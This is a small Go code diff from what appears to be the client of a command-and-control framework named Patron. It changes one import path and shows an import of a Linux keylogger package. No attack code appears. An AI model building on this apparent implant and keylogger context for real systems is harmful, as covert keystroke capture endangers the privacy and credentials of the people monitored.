@@ -14,7 +14,7 @@ import (
 
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils"
-	"github.com/PatronC2/Patron/client/client_utils/linux/linux_utils"
+	"github.com/PatronC2/Patron/client/linux_utils"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/PatronC2/linux-keylogger-1/keylogger"
